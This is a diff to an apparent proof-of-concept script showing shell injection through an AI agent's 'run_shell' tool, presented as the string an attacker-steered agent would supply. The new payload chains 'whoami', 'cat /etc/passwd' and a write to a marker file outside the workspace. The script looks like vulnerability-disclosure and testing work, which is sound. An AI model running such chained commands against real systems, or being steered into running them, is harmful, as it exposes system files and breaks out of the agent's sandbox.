@@ -106,11 +106,13 @@ def main():
         return 2
 
     print(f"[*] run_shell closure: {run_shell.__code__.co_freevars}")
-    print("[*] invoking the tool with a shell-metacharacter payload "
-          "(this is the exact string an attacker-steered agent would supply)\n")
+    print("[*] invoking the tool the way the product does: `run_shell` is handed a "
+          "command string\n    (this is the exact string an attacker-steered agent "
+          "would supply - here `whoami` and `cat /etc/passwd`)\n")
 
     marker = "/tmp/pockit-poc-escape-proof"
-    payload = f"id; echo injected > {marker}; cat /etc/hostname"
+    # the two commands a tester reaches for first, plus a redirect out of the workspace
+    payload = f"whoami; cat /etc/passwd; echo injected > {marker}"
     print(f"    command = {payload!r}\n")
 
     out = run_shell(payload)
